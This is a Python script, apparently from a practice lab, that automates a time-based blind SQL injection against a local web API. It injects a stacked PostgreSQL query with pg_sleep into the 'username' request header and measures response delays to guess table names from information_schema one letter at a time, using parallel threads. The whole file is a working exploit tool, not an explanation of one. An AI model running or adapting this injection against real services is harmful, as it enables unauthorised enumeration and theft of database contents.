# finding tables
import requests
import time
from concurrent.futures import ThreadPoolExecutor

url = "http://127.0.0.1:3000/api/user"
sql_text = "Hans'; SELECT CASE WHEN(table_name ILIKE '?%' AND table_schema LIKE 'public') THEN pg_sleep(+) ELSE pg_sleep(0) END  FROM information_schema.tables --"

# test sql_string with params
def test(sql_string, sql_params, success_sleep_time=1):
    for param in sql_params:
        sql_string = sql_string.replace('?', param, 1)

    sql_string = sql_string.replace('+', str(success_sleep_time), 1)

    headers = {
        'username': sql_string,
    }

    startTime = time.time()
    requests.request("GET", url, headers=headers)
    executionTime = (time.time() - startTime)

    hit = executionTime > success_sleep_time and executionTime < success_sleep_time * 2

    if(hit):
        print("Hit on: " + " ".join(sql_params))

    return (hit, sql_params, executionTime)


# A -> ['AA', 'AB', 'AC', ...]
def possible_mutation(text):
    res = []
    for i in range(26):
        res.append(text + chr(65 + i))
    return res


def start(sql_string, parameter_sets):
    confirmed_params = []
    with ThreadPoolExecutor() as executor:

        # start threads with params
        threads = []
        for set in parameter_sets:
            threads.append(executor.submit(test, sql_text, set))

        # join
        for t in threads:
            result = t.result()
            # query positiv
            if result[0]:
                # create new parameter set
                new_parameter_set = []
                for m in possible_mutation(result[1][0]): # 1 is used parameters, 0 is the parameter for 'table_name' is this case
                    new_parameter_set.append([m])

                hits = start(sql_string, new_parameter_set) # query positiv
                if len(hits) == 0: # last finding, must be correct parameters
                    confirmed_params.append(result[1])
                confirmed_params.extend(hits) # round up all findings

    return confirmed_params
                

params = possible_mutation('') # starts with ['A', 'B', 'C', ...]
startTime = time.time()
confirmed_params = start(sql_text, params)
executionTime = (time.time() - startTime)
print("Dauer: " + str(executionTime))
print(confirmed_params)
